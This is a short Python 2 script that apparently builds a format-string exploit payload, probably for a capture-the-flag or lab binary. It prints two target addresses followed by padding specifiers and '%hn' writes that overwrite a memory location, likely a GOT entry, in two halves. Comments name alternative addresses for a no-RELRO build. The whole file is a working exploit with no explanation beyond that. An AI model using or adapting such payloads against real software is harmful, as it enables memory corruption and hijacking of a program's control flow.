#!/usr/bin/env python2

#top is for no-relro
#lowerAdd='\x6c\xb2\x04\x08'
#upperAdd='\x6e\xb2\x04\x08'
lowerAdd='\x18\xc0\x04\x08'
upperAdd='\x1a\xc0\x04\x08'
print1="%56568x"
write1="%1$hn"
print2="%6879x"
write2="%2$hn"


print(lowerAdd + upperAdd + print1 + write1 + print2 + write2)
